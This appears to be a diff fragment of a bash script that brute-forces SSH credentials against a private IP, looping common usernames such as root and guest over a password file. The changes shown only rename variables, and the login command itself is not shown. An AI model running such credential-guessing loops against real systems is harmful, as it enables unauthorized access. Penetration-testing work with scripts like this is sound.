@@ -5,13 +5,13 @@ TARGET="172.16.10.13"
 PORT="22"
 
 # Define the username and password lists
-usernames=("root" "guest" "backup" "ubuntu" "centos")
-password_file="passwords.txt"
+USERNAMES=("root" "guest" "backup" "ubuntu" "centos")
+PASSWORD_FILE="passwords.txt"
 
 echo "Starting SSH credential testing..."
 
 # Loop through each combination of usernames and passwords
-for username in "${usernames[@]}"; do
+for username in "${USERNAMES[@]}"; do
     while IFS= read -r password; do
         echo "Testing credentials: ${username} / ${password}"
 
@@ -26,7 +26,7 @@ for username in "${usernames[@]}"; do
 
             exit 0
         fi
-    done < "${password_file}"
+    done < "${PASSWORD_FILE}"
 done
 
 echo "No valid credentials found."
